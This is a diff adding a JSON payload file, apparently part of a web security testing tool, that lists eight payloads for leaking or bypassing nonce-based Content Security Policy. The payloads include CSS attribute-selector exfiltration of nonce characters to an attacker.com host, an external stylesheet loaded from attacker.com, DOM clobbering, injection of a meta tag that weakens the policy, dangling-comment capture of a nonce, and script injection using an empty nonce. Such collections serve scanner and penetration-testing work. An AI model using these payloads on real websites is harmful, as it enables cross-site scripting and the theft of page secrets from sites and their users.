@@ -1,0 +1,80 @@
+{
+  "category": "csp_bypass",
+  "subcategory": "nonce_leakage",
+  "description": "Payloads targeting nonce-based CSP — leak or reuse nonces via CSS injection, DOM clobbering, or script gadgets",
+  "count": 8,
+  "payloads": [
+    {
+      "id": "csp-nonce-001",
+      "category": "csp_bypass",
+      "subcategory": "nonce_leakage",
+      "payload": "<style>script[nonce]{display:block}</style>",
+      "description": "CSS selector targeting nonce attribute — makes nonce visible in DOM",
+      "technique": "nonce_leakage",
+      "csp_bypass": "CSS attribute selector can detect nonce presence for further attacks"
+    },
+    {
+      "id": "csp-nonce-002",
+      "category": "csp_bypass",
+      "subcategory": "nonce_leakage",
+      "payload": "<style>script[nonce^='a']{background:url('https://attacker.com/leak?n=a')}</style>",
+      "description": "CSS exfiltration of nonce — character-by-character via attribute selectors",
+      "technique": "nonce_leakage",
+      "csp_bypass": "CSS attribute prefix selector leaks nonce value character by character"
+    },
+    {
+      "id": "csp-nonce-003",
+      "category": "csp_bypass",
+      "subcategory": "nonce_leakage",
+      "payload": "<img src=x onerror=alert(document.querySelector('script[nonce]').nonce)>",
+      "description": "Nonce read via DOM — requires unsafe-inline to execute",
+      "technique": "nonce_leakage",
+      "csp_bypass": "If unsafe-inline exists alongside nonce, nonce can be read from DOM"
+    },
+    {
+      "id": "csp-nonce-004",
+      "category": "csp_bypass",
+      "subcategory": "nonce_leakage",
+      "payload": "<form id=csp><input name=nonce value=attacker-nonce></form>",
+      "description": "DOM clobbering — creates document.csp.nonce to confuse nonce validation",
+      "technique": "nonce_leakage",
+      "csp_bypass": "DOM clobbering may confuse server-side nonce injection logic"
+    },
+    {
+      "id": "csp-nonce-005",
+      "category": "csp_bypass",
+      "subcategory": "nonce_leakage",
+      "payload": "<meta http-equiv='Content-Security-Policy' content=\"script-src 'unsafe-inline'\">",
+      "description": "Meta CSP override attempt — inject weaker CSP via meta tag",
+      "technique": "nonce_leakage",
+      "csp_bypass": "Meta CSP may override or weaken HTTP header CSP in some browsers"
+    },
+    {
+      "id": "csp-nonce-006",
+      "category": "csp_bypass",
+      "subcategory": "nonce_leakage",
+      "payload": "<!-- <script nonce='",
+      "description": "Dangling comment + nonce — consume nonce from next script tag",
+      "technique": "nonce_leakage",
+      "csp_bypass": "HTML comment injection may capture nonce from subsequent script element"
+    },
+    {
+      "id": "csp-nonce-007",
+      "category": "csp_bypass",
+      "subcategory": "nonce_leakage",
+      "payload": "<script src='data:,alert(document.domain)' nonce=''>",
+      "description": "Empty nonce test — some implementations accept empty nonce",
+      "technique": "nonce_leakage",
+      "csp_bypass": "Empty nonce attribute may pass validation in buggy implementations"
+    },
+    {
+      "id": "csp-nonce-008",
+      "category": "csp_bypass",
+      "subcategory": "nonce_leakage",
+      "payload": "<link rel=stylesheet href='https://attacker.com/exfil.css'>",
+      "description": "External CSS for nonce exfil — loads CSS with attribute selectors",
+      "technique": "nonce_leakage",
+      "csp_bypass": "External stylesheet with nonce-targeting attribute selectors"
+    }
+  ]
+}
